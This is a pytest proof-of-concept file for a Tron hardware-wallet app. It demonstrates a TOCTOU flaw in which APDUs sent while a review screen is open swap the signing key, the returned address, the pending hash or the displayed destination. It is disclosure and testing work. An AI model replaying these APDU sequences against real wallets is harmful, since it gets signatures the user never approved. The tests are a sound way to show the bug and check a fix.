#!/usr/bin/env python3
"""
TOCTOU proof-of-concept tests: asynchronous review context can be overwritten
by subsequent APDUs.

``apdu_dispatcher()`` (src/handlers/dispatcher.c) keeps accepting and
dispatching incoming APDUs while the device is displaying a review screen. All
the operations below share the same globals:

  * ``transactionContext``     (BIP32 path, hash, signature)
  * ``publicKeyContext``       (public key, chain code, base58 address)
  * ``G_io_apdu_buffer``       (also used as the amount/vote scratch buffer)
  * ``fromAddress`` / ``toAddress`` / ``fullContract`` / ``fullHash``

so a host can:

  1. start operation A and let the device display the review for A,
  2. send operation B while the user is still reading,
  3. have B overwrite the path / hash / public key / UI buffers,
  4. let the user approve, and see the callback operate on B's context.

IMPORTANT
---------
These tests assert the *vulnerable* behaviour of the baseline firmware. They
are a proof of concept, not a regression suite: once the dispatcher rejects
APDUs received while a review is pending, every test here is expected to fail
and its assertions must be inverted.

They are marked ``security_poc`` so CI can exclude them:

    pytest tests/ -m "not security_poc"      # normal suite
    pytest tests/test_toctou.py -m security_poc

Usage: pytest -v -s ./tests/test_toctou.py
"""
import hashlib
import sys
from pathlib import Path

import pytest
from ragger.navigator import NavInsID

from raw_apdu import (build_sign_apdus, get_public_key_apdu,
                      personal_message_first_apdu, raw_channel,
                      sign_txn_hash_apdu)
from tron import Errors, TronClient
from utils import check_hash_signature, check_tx_signature
'''
Tron Protobuf
'''
sys.path.append(f"{Path(__file__).parent.parent.resolve()}/proto")
from core import Contract_pb2 as contract
from core import Tron_pb2 as tron

DESTINATION_ADDRESS = "TBoTZcARzWVgnNuB9SyE3S5g1RwsXoQL16"
TRANSFER_AMOUNT = 100000000
MAX_REVIEW_PAGES = 30
NO_ANSWER_TIMEOUT = 3.0


###############################################################################
# Navigation helpers
###############################################################################
def approve_transaction(navigator, firmware, screen_change_first=False):
    """Walk a transaction review up to the approval step and approve it."""
    if firmware.is_nano:
        step = NavInsID.RIGHT_CLICK
        validation = [NavInsID.BOTH_CLICK]
        text = "Sign"
    else:
        step = NavInsID.SWIPE_CENTER_TO_LEFT
        validation = [
            NavInsID.USE_CASE_REVIEW_CONFIRM, NavInsID.USE_CASE_STATUS_DISMISS
        ]
        text = "Hold to sign"
    navigator.navigate_until_text(
        step,
        validation,
        text,
        screen_change_before_first_instruction=screen_change_first)


def approve_address(navigator, firmware, screen_change_first=False):
    """Walk an address verification flow and confirm it."""
    if firmware.is_nano:
        navigator.navigate_until_text(
            NavInsID.RIGHT_CLICK, [NavInsID.BOTH_CLICK],
            "Approve",
            screen_change_before_first_instruction=screen_change_first)
        return
    instructions = [
        NavInsID.SWIPE_CENTER_TO_LEFT,
        NavInsID.USE_CASE_ADDRESS_CONFIRMATION_CONFIRM,
        NavInsID.USE_CASE_STATUS_DISMISS
    ]
    navigator.navigate(
        instructions,
        screen_change_before_first_instruction=screen_change_first)


def wait_for_review(backend, timeout=10.0):
    """Wait for the review triggered by a pending (unanswered) APDU."""
    backend.wait_for_screen_change(timeout)


def settle(backend, timeout=2.0):
    """Let the app process an APDU that may or may not redraw the screen."""
    try:
        backend.wait_for_screen_change(timeout)
    except TimeoutError:
        pass


def screen_texts(backend):
    return [
        event.get("text", "")
        for event in backend.get_current_screen_content()["events"]
    ]


def walk_review(backend, navigator, firmware, max_pages=MAX_REVIEW_PAGES):
    """Collect the text of every review page, stopping on the sign step.

    Leaves the device on the approval page so the caller can approve without
    navigating any further.
    """
    step = (NavInsID.RIGHT_CLICK
            if firmware.is_nano else NavInsID.SWIPE_CENTER_TO_LEFT)
    stop = "Sign" if firmware.is_nano else "Hold to sign"

    pages = []
    for _ in range(max_pages):
        texts = screen_texts(backend)
        pages.append(texts)
        if any(stop in text for text in texts):
            return pages
        navigator.navigate([step],
                           screen_change_before_first_instruction=False)
    raise AssertionError("approval step never reached while walking review")


def approve_from_current_page(navigator, firmware):
    if firmware.is_nano:
        instructions = [NavInsID.BOTH_CLICK]
    else:
        instructions = [
            NavInsID.USE_CASE_REVIEW_CONFIRM, NavInsID.USE_CASE_STATUS_DISMISS
        ]
    navigator.navigate(instructions,
                       screen_change_before_first_instruction=False)


def flatten(pages):
    """Join every page's text, whitespace-stripped, for substring lookups."""
    return "".join("".join(text.split()) for page in pages for text in page)


###############################################################################
# Transaction helpers
###############################################################################
def transfer_tx(client, account_index=0, destination=DESTINATION_ADDRESS):
    return client.packContract(
        tron.Transaction.Contract.TransferContract,
        contract.TransferContract(owner_address=bytes.fromhex(
            client.getAccount(account_index)['addressHex']),
                                  to_address=bytes.fromhex(
                                      client.address_hex(destination)),
                                  amount=TRANSFER_AMOUNT))


def reference_address(client, account_index):
    """Ask the device (synchronously) for an account's base58 address."""
    rapdu = client.send_get_public_key_non_confirm(
        client.getAccount(account_index)['path'], False)
    _, address, _ = client.parse_get_public_key_response(rapdu.data, False)
    return address


@pytest.mark.security_poc
@pytest.mark.usefixtures('configuration')
class TestReviewContextTOCTOU():
    '''Proof of concept for the shared-review-context TOCTOU.'''

    def test_toctou_signing_key_substitution(self, backend, firmware,
                                             navigator):
        """A pending transaction review is signed with a substituted key.

        ``INS_SIGN_PERSONAL_MESSAGE`` with ``P1_FIRST`` and an announced
        message longer than the chunk actually sent rewrites
        ``transactionContext.bip32_path`` and replies ``0x9000`` right away,
        without displaying anything. ``ui_callback_tx_ok()`` then signs the
        hash the user reviewed with account 1's key instead of account 0's.
        """
        client = TronClient(backend, firmware, navigator)
        reviewed = client.getAccount(0)
        attacker = client.getAccount(1)

        tx = transfer_tx(client, 0)
        apdus = build_sign_apdus(client, reviewed['path'], tx)
        assert len(apdus) == 1, "test expects a single-APDU transaction"

        with raw_channel(backend) as channel:
            # 1. The device displays the review for account 0's transfer.
            channel.send(apdus[0])
            wait_for_review(backend)

            # 2. While the user reads, hijack the pending BIP32 path.
            injected = channel.exchange(
                personal_message_first_apdu(attacker['path'],
                                            declared_length=64,
                                            chunk=b"\xaa" * 8))
            assert injected.status == Errors.OK, \
                "the device refused the interleaved APDU (already fixed?)"

            # 3. The user approves what is still account 0's transfer.
            approve_transaction(navigator, firmware)
            response = channel.receive()

        assert response.status == Errors.OK
        signature = response.data[0:65]

        # The signature is valid... under the key that was never reviewed.
        assert check_tx_signature(tx, signature, attacker['publicKey'][2:]), \
            "expected the substituted key to have signed the reviewed hash"
        assert not check_tx_signature(tx, signature,
                                      reviewed['publicKey'][2:]), \
            "the reviewed account should not be the signer any more"

    def test_toctou_address_verification_swap(self, backend, firmware,
                                              navigator):
        """Address verification returns a key the user never approved.

        ``GET_PUBLIC_KEY`` with ``P1_NON_CONFIRM`` answers immediately and
        overwrites the global ``publicKeyContext``. Approving the pending
        confirmation flow then returns account 1's key and address, although
        account 0's address is what was displayed.
        """
        client = TronClient(backend, firmware, navigator)
        reviewed_address = reference_address(client, 0)
        injected_address = reference_address(client, 1)
        assert reviewed_address != injected_address

        with raw_channel(backend) as channel:
            # 1. The device displays account 0's address for verification.
            channel.send(
                get_public_key_apdu(client.getAccount(0)['path'],
                                    confirm=True))
            wait_for_review(backend)

            # 2. Overwrite publicKeyContext with account 1 mid-review.
            injected = channel.exchange(
                get_public_key_apdu(client.getAccount(1)['path'],
                                    confirm=False))
            assert injected.status == Errors.OK, \
                "the device refused the interleaved APDU (already fixed?)"
            _, injected_reply, _ = client.parse_get_public_key_response(
                injected.data, False)
            assert injected_reply == injected_address

            # 3. The user approves the address shown on screen.
            approve_address(navigator, firmware)
            response = channel.receive()

        assert response.status == Errors.OK
        _, returned_address, _ = client.parse_get_public_key_response(
            response.data, False)

        assert returned_address == injected_address, \
            "expected the overwritten context to be returned"
        assert returned_address != reviewed_address, \
            "the confirmed address should no longer be the reviewed one"

    def test_toctou_pending_hash_replacement(self, backend, firmware,
                                             navigator):
        """A second sign-by-hash replaces the hash under review.

        The first request is silently dropped: the device never answers it,
        and the single signature it eventually produces covers the second,
        attacker-supplied hash.
        """
        client = TronClient(backend, firmware, navigator)
        account = client.getAccount(0)
        reviewed_hash = hashlib.sha256(b"tx reviewed by the user").digest()
        injected_hash = hashlib.sha256(b"tx injected by the host").digest()

        with raw_channel(backend) as channel:
            # 1. Review of the first hash.
            channel.send(sign_txn_hash_apdu(account['path'], reviewed_hash))
            wait_for_review(backend)

            # 2. Replace transactionContext.hash mid-review. No reply comes
            #    back: this APDU only restarts the review flow.
            channel.send(sign_txn_hash_apdu(account['path'], injected_hash))
            settle(backend)

            # 3. A single approval, a single signature.
            approve_transaction(navigator, firmware)
            response = channel.receive()
            orphan = channel.try_receive(timeout=NO_ANSWER_TIMEOUT)

        assert response.status == Errors.OK
        signature = response.data[0:65]

        assert check_hash_signature(injected_hash, signature,
                                    account['publicKey'][2:]), \
            "expected the replacement hash to have been signed"
        assert not check_hash_signature(reviewed_hash, signature,
                                        account['publicKey'][2:]), \
            "the first, reviewed hash should not be the signed one"
        assert orphan is None, \
            "one of the two requests should have been left unanswered"

    def test_toctou_ui_buffer_clobbering(self, backend, firmware, navigator):
        """The review screen mutates while it is being read.

        ``handleGetPublicKey()`` copies its result into the shared
        ``toAddress`` buffer, which the transfer review uses to display the
        destination. Sending a non-confirming ``GET_PUBLIC_KEY`` mid-review
        therefore rewrites the destination shown to the user, while the
        transaction that eventually gets signed is still the original one.
        """
        client = TronClient(backend, firmware, navigator)
        account = client.getAccount(0)
        injected_address = reference_address(client, 1)
        assert injected_address != DESTINATION_ADDRESS

        tx = transfer_tx(client, 0)
        apdus = build_sign_apdus(client, account['path'], tx)
        assert len(apdus) == 1, "test expects a single-APDU transaction"

        # Reference run: no interleaved APDU, the review is left untouched.
        with raw_channel(backend) as channel:
            channel.send(apdus[0])
            wait_for_review(backend)
            clean_pages = walk_review(backend, navigator, firmware)
            approve_from_current_page(navigator, firmware)
            clean = channel.receive()
        assert clean.status == Errors.OK

        # Attack run: clobber toAddress once the review is on screen.
        with raw_channel(backend) as channel:
            channel.send(apdus[0])
            wait_for_review(backend)
            injected = channel.exchange(
                get_public_key_apdu(client.getAccount(1)['path'],
                                    confirm=False))
            assert injected.status == Errors.OK, \
                "the device refused the interleaved APDU (already fixed?)"
            dirty_pages = walk_review(backend, navigator, firmware)
            approve_from_current_page(navigator, firmware)
            dirty = channel.receive()
        assert dirty.status == Errors.OK

        clean_text = flatten(clean_pages)
        dirty_text = flatten(dirty_pages)

        assert DESTINATION_ADDRESS in clean_text, \
            "sanity check: the reference review should show the destination"
        assert injected_address not in clean_text
        assert injected_address in dirty_text, \
            "expected the injected address to have replaced the destination"

        # ... yet the signature still covers the original transaction, so what
        # is displayed and what is signed no longer match.
        assert check_tx_signature(tx, dirty.data[0:65],
                                  account['publicKey'][2:])
